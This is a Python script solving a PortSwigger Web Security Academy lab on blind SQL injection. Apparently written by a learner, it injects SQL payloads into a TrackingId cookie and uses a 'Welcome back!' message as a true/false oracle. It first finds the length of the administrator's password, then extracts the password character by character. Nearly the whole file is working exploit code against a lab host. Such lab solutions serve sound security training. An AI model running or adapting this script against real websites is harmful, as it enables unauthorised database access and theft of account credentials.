# Lab: Blind SQL injection with conditional responses
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Start date: 2.20.2021
# Date lab was completed
import requests

# https://stackoverflow.com/questions/17182656/how-do-i-iterate-through-the-alphabet
# Making the assumption that the password is all lowercase letters... but this is where I am unsure
from string import ascii_lowercase, digits

print("Starting the script! Yeehaw!")
link = "https://ac5a1f711e8d54a581b5855b00de007b.web-security-academy.net/"

response = requests.get(link)

# print(response.cookies["TrackingId"])

trackingCookie = response.cookies["TrackingId"]
print(trackingCookie)
# First, let's find the password length!

lowerRange = 2
upperRange = 30

isWelcomeBackPresentInResponse = False 

pwLength = 0

for potenLen in range(lowerRange, upperRange + 1):
    findPwLenQuery = "' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = '"
    evilCookie = trackingCookie + findPwLenQuery + str(potenLen)
    cookies = {"TrackingId": evilCookie}
    # print("le evil cookie: " + evilCookie)
    # print("Iterating! Making le request")
    response = requests.get(link, cookies = cookies)

    if "Welcome back!" in response.text:
        print("Password length found! It's " + str(potenLen) + " chars long!")
        print("Breaking!")
        break
    else:
        print("This one ain't it, Len %d" % (potenLen))

print("Officially out of the for loop!!!!")

pwStr = ""
findPwCharQueryFirst = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "
# change the first char and last char of this string 
findPwCharQuerySecond = ", 1) = '"

alphaChars = ascii_lowercase + digits
for x in range(1, 21):
    for c in alphaChars:
        findPwQuery = findPwCharQueryFirst + str(x) + findPwCharQuerySecond + c
        evilCookie = trackingCookie + findPwQuery
        cookies = {"TrackingId": evilCookie}
        response = requests.get(link, cookies = cookies)

        if "Welcome back!" in response.text:
            pwStr += c
            print("Char no %d found, it's %s" % (x, c))
            break
        else:
            print('EvilCookie %s' % evilCookie)
            print("This one ain't it. Iteration char %s" % (c))

print("Your final pw is %s" % pwStr)